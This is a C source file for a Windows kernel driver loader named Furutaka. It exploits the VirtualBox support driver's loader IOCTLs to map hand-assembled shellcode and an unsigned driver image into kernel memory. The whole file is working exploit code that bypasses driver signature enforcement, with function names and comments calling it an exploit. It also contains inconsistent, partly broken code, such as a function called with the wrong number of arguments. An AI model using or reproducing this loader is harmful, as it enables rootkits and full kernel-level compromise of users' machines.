/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.00
*
*  DATE:        04 Feb 2016
*
*  Furutaka entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include <process.h>
#include "vbox.h"
#include "shellcode.h"
WCHAR      BE = 0xFEFF;

#define supImageName    "furutaka"
#define supImageHandle  0x1a000
#define PAGE_SIZE       0x1000
#define scDataOffset    0x214 //shellcode data offset

// Process image relocs.
void RelocImage(ULONG_PTR Image,	ULONG_PTR NewImageBase)
{
	PIMAGE_OPTIONAL_HEADER   popth;
	PIMAGE_BASE_RELOCATION   rel;
	DWORD_PTR                delta;
	LPWORD                   chains;
	DWORD                    c, p, rsz;

	popth = &RtlImageNtHeader((PVOID)Image)->OptionalHeader;

	if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
		if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		{
			rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
				popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

			rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
			delta = (DWORD_PTR)NewImageBase - popth->ImageBase;
			c = 0;

			while (c < rsz) {
				p = sizeof(IMAGE_BASE_RELOCATION);
				chains = (LPWORD)((PBYTE)rel + p);

				while (p < rel->SizeOfBlock) {

					switch (*chains >> 12) {
					case IMAGE_REL_BASED_HIGHLOW:
						*(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
						break;
					case IMAGE_REL_BASED_DIR64:
						*(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
						break;
					}

					chains++;
					p += sizeof(WORD);
				}

				c += rel->SizeOfBlock;
				rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
			}
		}
}

// GetProcAddress
ULONG_PTR GetProcAddressImage(ULONG_PTR KernelBase,ULONG_PTR KernelImage,LPCSTR FunctionName)
{
	ANSI_STRING    cStr;
	ULONG_PTR      pfn = 0;

	DPRINT("IMPORTED %s\n", FunctionName);

	RtlInitString(&cStr, FunctionName);
	if (!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID)&pfn)))
		return 0;

	return KernelBase + (pfn - KernelImage);
}

char* replace_str(char *str, char *orig, char *rep, int start)
{
	static char temp[4096];
	static char buffer[4096];
	char *p;

	strcpy(temp, str + start);

	if (!(p = strstr(temp, orig)))  // Is 'orig' even in 'temp'?
		return temp;

	strncpy(buffer, temp, p - temp); // Copy characters from 'temp' start to 'orig' str
	buffer[p - temp] = '\0';

	sprintf(buffer + (p - temp), "%s%s", rep, p + strlen(orig));
	sprintf(str + start, "%s", buffer);

	return str;
}

PVOID getKernelBase(char* name)
{
	ULONG i;
	PVOID iBase = NULL;
	PRTL_PROCESS_MODULES ModuleInfo = supGetSystemInfo(SystemModuleInformation);
	for (i = 0; i<ModuleInfo->NumberOfModules; i++)
	{
		if (strstr(ModuleInfo->Modules[i].FullPathName, name) != NULL) {
			DPRINT("FOUND! %s\n", ModuleInfo->Modules[i].FullPathName);
			iBase = ModuleInfo->Modules[i].ImageBase;
			break;
		}
	}
	return iBase;
}

wchar_t* getKernelPath(char* name)
{
	ULONG i;
	PRTL_PROCESS_MODULES ModuleInfo = supGetSystemInfo(SystemModuleInformation);
	for (i = 0; i<ModuleInfo->NumberOfModules; i++)
	{
		if (strstr(ModuleInfo->Modules[i].FullPathName, name) != NULL) {
			DPRINT("FOUND! %s\n", ModuleInfo->Modules[i].FullPathName);
			//UNICODE_STRING ustrImpDll = { 0 };
			//ANSI_STRING strImpDll = { 0 };

			char* path = replace_str(ModuleInfo->Modules[i].FullPathName, "\\SystemRoot", getenv("systemroot"), 0);
			path = replace_str(path, name, "", 0);
			path[strlen(path) - 1] = 0;

			wchar_t wout[256];
			swprintf_s(wout, "%s", "C:\\WINDOWS\\system32");

			//RtlInitAnsiString(&strImpDll, "C:\\WINDOWS\\system32");
			//RtlAnsiStringToUnicodeString(&ustrImpDll, &strImpDll, TRUE);
			return L"C:\\WINDOWS\\system32";
		}
	}
}

LPWSTR getDriverPath(char* name) {
	if (strstr("ntoskrnl.exe", name) != NULL)
		return L"C:\\WINDOWS\\system32";

	return L"C:\\WINDOWS\\system32\\drivers";
}


#define IMAGE32(hdr) (hdr->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
#define IMAGE64(hdr) (hdr->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)

#define HEADER_VAL_T(hdr, val) (IMAGE64(hdr) ? ((PIMAGE_NT_HEADERS64)hdr)->OptionalHeader.val : ((PIMAGE_NT_HEADERS32)hdr)->OptionalHeader.val)
#define THUNK_VAL_T(hdr, ptr, val) (IMAGE64(hdr) ? ((PIMAGE_THUNK_DATA64)ptr)->val : ((PIMAGE_THUNK_DATA32)ptr)->val)
#define TLS_VAL_T(hdr, ptr, val) (IMAGE64(hdr) ? ((PIMAGE_TLS_DIRECTORY64)ptr)->val : ((PIMAGE_TLS_DIRECTORY32)ptr)->val)
#define CFG_DIR_VAL_T(hdr, dir, val) (IMAGE64(hdr) ? ((PIMAGE_LOAD_CONFIG_DIRECTORY64)dir)->val : ((PIMAGE_LOAD_CONFIG_DIRECTORY32)dir)->val)

NTSTATUS TestImports(PVOID pImageBase) {
	NTSTATUS status = STATUS_SUCCESS;
	ULONG impSize = 0;
	PIMAGE_NT_HEADERS pHeader = RtlImageNtHeader(pImageBase);
	PIMAGE_IMPORT_DESCRIPTOR pImportTbl = RtlImageDirectoryEntryToData(pImageBase, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &impSize);

	// No import libs
	if (pImportTbl == NULL)
		return STATUS_SUCCESS;

	for (; pImportTbl->Name && NT_SUCCESS(status); ++pImportTbl)
	{
		PVOID pThunk = ((PUCHAR)pImageBase + (pImportTbl->OriginalFirstThunk ? pImportTbl->OriginalFirstThunk : pImportTbl->FirstThunk));
		UNICODE_STRING ustrImpDll = { 0 };
		ANSI_STRING strImpDll = { 0 };
		PCHAR sysName[256];
		ULONG IAT_Index = 0;

		RtlInitAnsiString(&strImpDll, (PCHAR)pImageBase + pImportTbl->Name);
		RtlAnsiStringToUnicodeString(&ustrImpDll, &strImpDll, TRUE);

		sprintf(sysName, "%wZ", ustrImpDll);

		PVOID KernelBase = getKernelBase(sysName);

		ULONG_PTR KernelImage = NULL;
		status = LdrLoadDll(getDriverPath(sysName), NULL, &ustrImpDll, (PVOID)&KernelImage);
		if (!NT_SUCCESS(status)) {
			DPRINT("FAILED %wZ %X\n", ustrImpDll, status);
			return status;
		}


		while (THUNK_VAL_T(pHeader, pThunk, u1.AddressOfData))
		{
			PIMAGE_IMPORT_BY_NAME pAddressTable = (PIMAGE_IMPORT_BY_NAME)((PUCHAR)pImageBase + THUNK_VAL_T(pHeader, pThunk, u1.AddressOfData));
			PVOID pFunc = NULL;
		
			if (THUNK_VAL_T(pHeader, pThunk, u1.AddressOfData) < (IMAGE64(pHeader) ? IMAGE_ORDINAL_FLAG64 : IMAGE_ORDINAL_FLAG32) && pAddressTable->Name[0])
			{
				pFunc = GetProcAddressImage(KernelBase, KernelImage, pAddressTable->Name);
			}
			else
				pFunc = GetProcAddressImage(KernelBase, KernelImage, (LPCSTR)(THUNK_VAL_T(pHeader, pThunk, u1.AddressOfData) & 0xFFFF));

			if (!pFunc) {
				DPRINT("Failed to resolve import '%wZ' : '%s'\n", ustrImpDll, pAddressTable->Name);
				return STATUS_NOT_FOUND;
			}

			// Save address to IAT
			if (pImportTbl->FirstThunk) {
				DPRINT("Tis\n");
				*(PULONG_PTR)((PUCHAR)pImageBase + pImportTbl->FirstThunk + IAT_Index) = (ULONG_PTR)pFunc;
				// Save address to OrigianlFirstThunk
			}
			else
				*(PULONG_PTR)((PUCHAR)pImageBase + THUNK_VAL_T(pHeader, pThunk, u1.AddressOfData)) = (ULONG_PTR)pFunc;


			DPRINT("import '%wZ' : '%s'\n", ustrImpDll, pAddressTable->Name);

			pThunk = (PUCHAR)pThunk + (IMAGE64(pHeader) ? sizeof(IMAGE_THUNK_DATA64) : sizeof(IMAGE_THUNK_DATA32));
			IAT_Index += (IMAGE64(pHeader) ? sizeof(ULONGLONG) : sizeof(ULONG));
		}

	}

	return status;
}

//  Resolve import (ntoskrnl only).
void ResolveKernelImport(ULONG_PTR Image,ULONG_PTR KernelImage,ULONG_PTR KernelBase)
{
	PIMAGE_OPTIONAL_HEADER      popth;
	ULONG_PTR                   ITableVA, *nextthunk;
	PIMAGE_IMPORT_DESCRIPTOR    ITable;
	PIMAGE_THUNK_DATA           pthunk;
	PIMAGE_IMPORT_BY_NAME       pname;
	ULONG                       i;

	popth = &RtlImageNtHeader((PVOID)Image)->OptionalHeader;

	if (popth->NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_IMPORT)
		return;

	ITableVA = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	if (ITableVA == 0)
		return;

	ITable = (PIMAGE_IMPORT_DESCRIPTOR)(Image + ITableVA);


	if (ITable->OriginalFirstThunk == 0)
		pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->FirstThunk);
	else
		pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->OriginalFirstThunk);

	for (i = 0; pthunk->u1.Function != 0; i++, pthunk++) {
		nextthunk = (PULONG_PTR)(Image + ITable->FirstThunk);
		if ((pthunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) == 0) {
			pname = (PIMAGE_IMPORT_BY_NAME)((PCHAR)Image + pthunk->u1.AddressOfData);
			nextthunk[i] = GetProcAddressImage(KernelBase, KernelImage, pname->Name);
		}
		else
			nextthunk[i] = GetProcAddressImage(KernelBase, KernelImage, (LPCSTR)(pthunk->u1.Ordinal & 0xffff));
	}
}

// Execute shellcode with virtual box exploit
void VBoxExecute(HANDLE hVBox, LPVOID Shellcode, ULONG CodeSize)
{
	SUPCOOKIE       Cookie;
	SUPLDROPEN      OpenLdr;
	DWORD           bytesIO = 0;
	RTR0PTR         ImageBase = NULL;
	ULONG_PTR       paramOut;
	PSUPLDRLOAD     pLoadTask = NULL;
	SUPSETVMFORFAST vmFast;
	SUPLDRFREE      ldrFree;
	SIZE_T          memIO;
	WCHAR           text[256];

	while (hVBox != INVALID_HANDLE_VALUE) {
		RtlSecureZeroMemory(&Cookie, sizeof(SUPCOOKIE));
		Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
		Cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
		Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
		Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
		Cookie.Hdr.rc = 0;
		Cookie.u.In.u32ReqVersion = 0;
		Cookie.u.In.u32MinVersion = 0x00070002;
		RtlCopyMemory(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof(SUPCOOKIE_MAGIC));

		if (!DeviceIoControl(hVBox, SUP_IOCTL_COOKIE,
			&Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
			SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL)) 
		{
			DPRINT("Ldr: SUP_IOCTL_COOKIE call failed\n");
			break;
		}

		RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
		OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
		OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
		OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
		OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
		OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
		OpenLdr.Hdr.rc = 0;
		OpenLdr.u.In.cbImage = CodeSize;
		RtlCopyMemory(OpenLdr.u.In.szName, supImageName, sizeof(supImageName));

		if (!DeviceIoControl(hVBox, SUP_IOCTL_LDR_OPEN, &OpenLdr,
			SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
			SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL))
		{
			DPRINT("Ldr: SUP_IOCTL_LDR_OPEN call failed\n");
			break;
		}
		else {
			DPRINT("Ldr: OpenLdr.u.Out.pvImageBase = 0x%X\n", (ULONG_PTR)OpenLdr.u.Out.pvImageBase);
		}

		ImageBase = OpenLdr.u.Out.pvImageBase;

		memIO = PAGE_SIZE + CodeSize;
		NtAllocateVirtualMemory(NtCurrentProcess(), &pLoadTask, 0, &memIO,
			MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (pLoadTask == NULL)
			break;

		pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
		pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
		pLoadTask->Hdr.cbIn =
			(ULONG_PTR)(&((PSUPLDRLOAD)0)->u.In.achImage) + CodeSize;
		pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
		pLoadTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
		pLoadTask->Hdr.rc = 0;
		pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
		pLoadTask->u.In.pvImageBase = ImageBase;
		pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)supImageHandle;
		pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = ImageBase;
		pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = ImageBase;
		pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = ImageBase;
		RtlCopyMemory(pLoadTask->u.In.achImage, Shellcode, CodeSize);
		pLoadTask->u.In.cbImage = CodeSize;

		if (!DeviceIoControl(hVBox, SUP_IOCTL_LDR_LOAD,
			pLoadTask, pLoadTask->Hdr.cbIn,
			pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL))
		{
			DPRINT("Ldr: SUP_IOCTL_LDR_LOAD call failed\n");
			break;
		}
		else {
			DPRINT("Ldr: SUP_IOCTL_LDR_LOAD, success\r\n\tShellcode mapped at 0x%X\n", (ULONG_PTR)ImageBase);
			DPRINT("\r\n\tDriver image mapped at 0x%X\n", (ULONG_PTR)ImageBase + scDataOffset);
		}

		RtlSecureZeroMemory(&vmFast, sizeof(vmFast));
		vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
		vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
		vmFast.Hdr.rc = 0;
		vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
		vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
		vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
		vmFast.u.In.pVMR0 = (LPVOID)supImageHandle;

		if (!DeviceIoControl(hVBox, SUP_IOCTL_SET_VM_FOR_FAST,&vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,&vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL))
		{
			DPRINT("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call failed\n");
			break;
		}
		else
			DPRINT("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call complete\n");

		DPRINT("Ldr: SUP_IOCTL_FAST_DO_NOP\n");

		paramOut = 0;
		DeviceIoControl(hVBox, SUP_IOCTL_FAST_DO_NOP,NULL, 0,&paramOut, sizeof(paramOut), &bytesIO, NULL);

		DPRINT("Ldr: SUP_IOCTL_LDR_FREE\n");

		RtlSecureZeroMemory(&ldrFree, sizeof(ldrFree));
		ldrFree.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
		ldrFree.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
		ldrFree.Hdr.cbIn = SUP_IOCTL_LDR_FREE_SIZE_IN;
		ldrFree.Hdr.cbOut = SUP_IOCTL_LDR_FREE_SIZE_OUT;
		ldrFree.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
		ldrFree.Hdr.rc = 0;
		ldrFree.u.In.pvImageBase = ImageBase;

		DeviceIoControl(hVBox, SUP_IOCTL_LDR_FREE,
			&ldrFree, SUP_IOCTL_LDR_FREE_SIZE_IN,
			&ldrFree, SUP_IOCTL_LDR_FREE_SIZE_OUT, &bytesIO, NULL);

		break;
	}

	if (pLoadTask != NULL) {
		memIO = 0;
		NtFreeVirtualMemory(NtCurrentProcess(), &pLoadTask, &memIO, MEM_RELEASE);
	}

	if (hVBox != INVALID_HANDLE_VALUE) {
		CloseHandle(hVBox);
		hVBox = INVALID_HANDLE_VALUE;
	}
}

// Build shellcode and execute exploit.
UINT MapDriver(HANDLE hVBox,LPWSTR lpDriverFullName)
{
	UINT               result = (UINT)-1;
	ULONG              isz;
	SIZE_T             memIO;
	ULONG_PTR          KernelBase, KernelImage = 0, xExAllocatePoolWithTag = 0, xPsCreateSystemThread = 0;
	HMODULE            Image = NULL;
	PIMAGE_NT_HEADERS  FileHeader;
	PBYTE              Buffer = NULL;
	UNICODE_STRING     uStr;
	ANSI_STRING        routineName;
	NTSTATUS           status;
	WCHAR              text[256];

	KernelBase = supGetNtOsBase();
	while (KernelBase != 0) {
		DPRINT("Ldr: Kernel base = 0x%X\n", KernelBase);

		RtlSecureZeroMemory(&uStr, sizeof(uStr));
		RtlInitUnicodeString(&uStr, lpDriverFullName);
		status = LdrLoadDll(NULL, NULL, &uStr, (PVOID)&Image);
		if ((!NT_SUCCESS(status)) || (Image == NULL)) {
			DPRINT("Ldr: Error while loading input driver file\n");
			break;
		}
		else
			DPRINT("Ldr: Input driver file loaded at 0x%X\n", (ULONG_PTR)Image);

		FileHeader = RtlImageNtHeader(Image);
		if (FileHeader == NULL)
			break;

		isz = FileHeader->OptionalHeader.SizeOfImage;

		DPRINT("Ldr: Loading ntoskrnl.exe\n");

		RtlInitUnicodeString(&uStr, L"ntoskrnl.exe");
		status = LdrLoadDll(NULL, NULL, &uStr, (PVOID)&KernelImage);
		if ((!NT_SUCCESS(status)) || (KernelImage == 0)) {
			DPRINT("Ldr: Error while loading ntoskrnl.exe\n");
			break;
		}
		else
			DPRINT("Ldr: ntoskrnl.exe loaded at 0x%X\n", KernelImage);

		RtlInitString(&routineName, "ExAllocatePoolWithTag");
		status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xExAllocatePoolWithTag);
		if ((!NT_SUCCESS(status)) || (xExAllocatePoolWithTag == 0)) {
			DPRINT("Ldr: Error, ExAllocatePoolWithTag address not found\n");
			break;
		}
		else
			DPRINT("Ldr: ExAllocatePoolWithTag 0x%X\n", KernelBase + (xExAllocatePoolWithTag - KernelImage));

		RtlInitString(&routineName, "PsCreateSystemThread");
		status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xPsCreateSystemThread);
		if ((!NT_SUCCESS(status)) || (xPsCreateSystemThread == 0)) {
			DPRINT("Ldr: Error, PsCreateSystemThread address not found\n");
			break;
		}
		else
			DPRINT("Ldr: PsCreateSystemThread 0x%Xn", KernelBase + (xPsCreateSystemThread - KernelImage));

		memIO = isz + PAGE_SIZE;
		NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID)&Buffer, 0, &memIO,
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (Buffer == NULL) {
			DPRINT("Ldr: Error, unable to allocate shellcode\n");
			break;
		}
		else
			DPRINT("Ldr: Shellcode allocated at 0x%X\n", (ULONG_PTR)Buffer);

		// mov rcx, ExAllocatePoolWithTag
		// mov rdx, PsCreateSystemThread

		Buffer[0x00] = 0x48; // mov rcx, xxxxx
		Buffer[0x01] = 0xb9;
		*((PULONG_PTR)&Buffer[2]) =
			KernelBase + (xExAllocatePoolWithTag - KernelImage);
		Buffer[0x0a] = 0x48; // mov rdx, xxxxx
		Buffer[0x0b] = 0xba;
		*((PULONG_PTR)&Buffer[0x0c]) =
			KernelBase + (xPsCreateSystemThread - KernelImage);

		RtlCopyMemory(Buffer + 0x14,
			TDLBootstrapLoader_code, sizeof(TDLBootstrapLoader_code));
		RtlCopyMemory(Buffer + scDataOffset, Image, isz);

		DPRINT("Ldr: Resolving kernel import\n");
		status = TestImports((ULONG_PTR)Buffer + scDataOffset, KernelImage, KernelBase);
		if (!NT_SUCCESS(status)) {
			DPRINT("FUCKED %X\n", status);
		}

		DPRINT("Ldr: Executing exploit\n");
		VBoxExecute(hVBox,Buffer, isz + PAGE_SIZE);
		result = 0;
		break;
	}

	if (Buffer != NULL) {
		memIO = 0;
		NtFreeVirtualMemory(NtCurrentProcess(), &Buffer, &memIO, MEM_RELEASE);
	}

	DPRINT("Complete!\n");

	return result;
}

// Build shellcode and execute exploit.
UINT MapDriverBuffer(HANDLE hVBox, PVOID image)
{
	UINT               result = (UINT)-1;
	ULONG              isz;
	SIZE_T             memIO;
	ULONG_PTR          KernelBase, KernelImage = 0, xExAllocatePoolWithTag = 0, xPsCreateSystemThread = 0;
	PIMAGE_NT_HEADERS  FileHeader;
	PBYTE              Buffer = NULL;
	UNICODE_STRING     uStr;
	ANSI_STRING        routineName;
	NTSTATUS           status;
	WCHAR              text[256];

	KernelBase = supGetNtOsBase();
	while (KernelBase != 0) {
		DPRINT("Ldr: Kernel base = 0x%X\n", KernelBase);


		FileHeader = RtlImageNtHeader(image);
		if (FileHeader == NULL)
			break;

		isz = FileHeader->OptionalHeader.SizeOfImage;

		DPRINT("IMAGE SIZE 0x%X\n", isz);

		DPRINT("Ldr: Loading ntoskrnl.exe\n");

		RtlInitUnicodeString(&uStr, L"ntoskrnl.exe");
		status = LdrLoadDll(NULL, NULL, &uStr, (PVOID)&KernelImage);
		if ((!NT_SUCCESS(status)) || (KernelImage == 0)) {
			DPRINT("Ldr: Error while loading ntoskrnl.exe\n");
			break;
		}
		else
			DPRINT("Ldr: ntoskrnl.exe loaded at 0x%X\n", KernelImage);

		RtlInitString(&routineName, "ExAllocatePoolWithTag");
		status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xExAllocatePoolWithTag);
		if ((!NT_SUCCESS(status)) || (xExAllocatePoolWithTag == 0)) {
			DPRINT("Ldr: Error, ExAllocatePoolWithTag address not found\n");
			break;
		}
		else
			DPRINT("Ldr: ExAllocatePoolWithTag 0x%X\n", KernelBase + (xExAllocatePoolWithTag - KernelImage));

		RtlInitString(&routineName, "PsCreateSystemThread");
		status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xPsCreateSystemThread);
		if ((!NT_SUCCESS(status)) || (xPsCreateSystemThread == 0)) {
			DPRINT("Ldr: Error, PsCreateSystemThread address not found\n");
			break;
		}
		else
			DPRINT("Ldr: PsCreateSystemThread 0x%Xn", KernelBase + (xPsCreateSystemThread - KernelImage));

		memIO = isz + PAGE_SIZE;
		NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID)&Buffer, 0, &memIO,
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (Buffer == NULL) {
			DPRINT("Ldr: Error, unable to allocate shellcode\n");
			break;
		}
		else
			DPRINT("Ldr: Shellcode allocated at 0x%X\n", (ULONG_PTR)Buffer);

		// mov rcx, ExAllocatePoolWithTag
		// mov rdx, PsCreateSystemThread

		Buffer[0x00] = 0x48; // mov rcx, xxxxx
		Buffer[0x01] = 0xb9;
		*((PULONG_PTR)&Buffer[2]) =
			KernelBase + (xExAllocatePoolWithTag - KernelImage);
		Buffer[0x0a] = 0x48; // mov rdx, xxxxx
		Buffer[0x0b] = 0xba;
		*((PULONG_PTR)&Buffer[0x0c]) =
			KernelBase + (xPsCreateSystemThread - KernelImage);

		RtlCopyMemory(Buffer + 0x14,
			TDLBootstrapLoader_code, sizeof(TDLBootstrapLoader_code));
		RtlCopyMemory(Buffer + scDataOffset, image, isz);

		DPRINT("shit -> 0x%X\n", RtlImageNtHeader((ULONG_PTR)Buffer + scDataOffset)->OptionalHeader.SizeOfImage);

		DPRINT("Ldr: Resolving kernel import\n");
		ResolveKernelImport((ULONG_PTR)Buffer + scDataOffset, KernelImage, KernelBase);

		DPRINT("Ldr: Executing exploit\n");
		//VBoxExecute(hVBox, Buffer, isz + PAGE_SIZE);
		result = 0;
		break;
	}

	if (Buffer != NULL) {
		memIO = 0;
		NtFreeVirtualMemory(NtCurrentProcess(), &Buffer, &memIO, MEM_RELEASE);
	}

	DPRINT("Complete!\n");

	return result;
}
